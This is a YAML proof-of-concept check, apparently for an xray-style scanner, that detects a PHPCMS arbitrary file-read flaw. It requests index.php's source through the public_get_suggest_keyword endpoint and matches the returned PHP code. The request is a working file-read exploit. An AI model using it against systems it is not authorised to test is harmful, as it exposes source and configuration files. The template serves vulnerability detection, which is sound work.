name: poc-yaml-phpcms-publicgetsuggestkeyword-fileread
binding: 47accd67-6f7a-43eb-a1db-092bbd9c3317
manual: true
detail:
    author: y0y0
    links:
        - https://www.cnblogs.com/handt/archive/2012/07/27/2612329.html
        - https://fofa.info/result?qbase64=InBocGNtcyI%3D
    vulnerability:
        level: medium
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=index.php
            follow_redirects: false
        expression: 'response.status == 200 && response.body_string.startsWith("<?php") && response.body_string.contains("define(''PHPCMS_PATH'', dirname(__FILE__).DIRECTORY_SEPARATOR);") && response.body_string.contains("include PHPCMS_PATH.''/phpcms/base.php'';")'
expression: r0()
